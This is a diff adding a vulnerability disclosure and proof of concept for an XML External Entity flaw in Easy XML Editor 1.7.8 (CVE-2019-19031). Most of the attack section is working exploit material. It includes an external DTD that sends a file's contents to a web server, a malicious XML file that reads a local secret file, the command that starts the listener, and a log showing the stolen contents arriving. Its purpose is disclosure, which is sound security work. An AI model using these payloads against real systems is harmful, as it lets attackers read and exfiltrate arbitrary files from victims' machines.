@@ -1,0 +1,61 @@
+# Exploit Title: Easy XML Editor 1.7.8 - XML External Entity Injection
+# Exploit Author: Javier Olmedo
+# Date: 2018-11-21
+# Vendor: Richard Wuerflein
+# Software Link: https://www.edit-xml.com/Easy_XML_Editor.exe
+# Affected Version: 1.7.8 and before
+# Patched Version: unpatched
+# Category: Local
+# Platform: XML
+# Tested on: Windows 10 Pro
+# CWE: https://cwe.mitre.org/data/definitions/611.html
+# CVE: 2019-19031
+# References:
+# https://hackpuntes.com/cve-2019-19031-easy-xml-editor-1-7-8-inyeccion-xml/
+ 
+# 1. Technical Description
+# Easy XML Editor version 1.7.8 and before are affected by XML External Entity Injection vulnerability
+# through the malicious XML file. This allows a malicious user to read arbitrary files.
+ 
+# 2. Proof Of Concept (PoC)
+# 2.1 Start a webserver to receive the connection.
+
+python -m SimpleHTTPServer 80
+
+# 2.2 Upload the payload.dtd file to your web server.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:80/?%file;'>">
+%all;
+
+# 2.3 Create a SECRET.TXT file with any content in desktop.
+
+# 2.4 Open poc.xml
+
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "file:///C:\Users\<USER>\Desktop\secret.txt">
+<!ENTITY % dtd SYSTEM "http://localhost:80/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+# 2.5 Your web server will receive a request with the contents of the secret.txt file
+
+Serving HTTP on 0.0.0.0 port 8000 ...
+192.168.100.23 - - [11/Nov/2019 08:23:52] "GET /payload.dtd HTTP/1.1" 200 -
+192.168.100.23 - - [11/Nov/2019 08:23:52] "GET /?THIS%20IS%20A%20SECRET%20FILE HTTP/1.1" 200 -
+
+# 3. Timeline
+# 13, november 2019 - [RESEARCHER] Discover
+# 13, november 2019 - [RESEARCHER] Report to vendor support
+# 14, november 2019 - [DEVELOPER]  Unrecognized vulnerability
+# 15, november 2019 - [RESEARCHER] Detailed vulnerability report
+# 22, november 2019 - [RESEARCHER] Public disclosure
+
+# 4. Disclaimer
+# The information contained in this notice is provided without any guarantee of use or otherwise.
+# The redistribution of this notice is explicitly permitted for insertion into vulnerability
+# databases, provided that it is not modified and due credit is granted to the author.
+# The author prohibits the malicious use of the information contained herein and accepts no responsibility.
+# All content (c)
+# Javier Olmedo
